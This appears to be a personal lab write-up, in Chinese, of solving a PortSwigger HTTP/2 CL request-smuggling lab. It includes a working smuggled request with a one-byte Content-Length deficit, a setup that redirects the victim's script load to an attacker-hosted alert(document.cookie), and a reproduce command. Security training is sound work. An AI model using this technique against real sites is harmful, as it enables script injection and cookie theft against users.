---
title: lab-request-smuggling-h2-cl-request-smuggling
---

# lab-request-smuggling-h2-cl-request-smuggling

> evidences: [[h2-smuggling-family]]

PortSwigger `request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling`。实例(批 44)`0adf00e803dc315080372b0600810093`,exploit server `exploit-0af00050030b31e080ae2a84013d00cb.exploit-server.net`(从实例首页 `#exploit-link` 读出)。目标:让受害者浏览器加载并执行 exploit server 的 JS。

- 判定:**solved**(横幅 `Congratulations, you solved the lab!`)。

## 收口形(与批 41 的关键差异)

- **走私请求必须"欠字节"(deficit 1)**:`Content-Length: 13` 而体只有 `smuggled=yes`(12B)⇒ 后端 holding、等下一个请求的**第一个字节**补全;这样 302 才会被记在**补全者**(受害者的 JS 请求)头上。
  - 批 41 把走私请求写成**完整**请求 ⇒ 302 立刻生成、无人认领 ⇒ 不可交付。
- 走私请求的 `Host` 必须是 exploit server:`GET /resources HTTP/1.1` + `Host: exploit-…` ⇒ 靶场 app 的目录重定向按 Host 生成**绝对** 302 `Location: https://exploit-…/resources/`(实测直连 `/resources` 即绝对形)。
- exploit server 上把载荷存到 **`/resources/`**(带尾斜杠——正是 302 的目标路径),`responseHead` 只两行:`HTTP/1.1 200 OK` + `Content-Type: text/javascript`,体 `alert(document.cookie)`。
- **重复 arm 是必需的**:用 `h2cl_seq` 12 轮(每轮 arm + 独立新连接 follow)测得 **3/12 轮** follow 收到 302 ⇒ 前端确实会把"带待定走私请求的后端连接"交给后续请求;持续 arm 直到受害者的 **script 请求**(`analytics.js?uid=…`)撞上它。

## 复现

```
h2cl_seq <inst>/ --data 'GET /resources HTTP/1.1\r\nHost: exploit-<id>.exploit-server.net\r\nContent-Length: 13\r\n\r\nsmuggled=yes' \
  --follow /resources/js/analytics.js?uid=keepalive --rounds 110 --interval-ms 1600 --read-ms 1200 --quiet
banner_verdict <inst>/
```
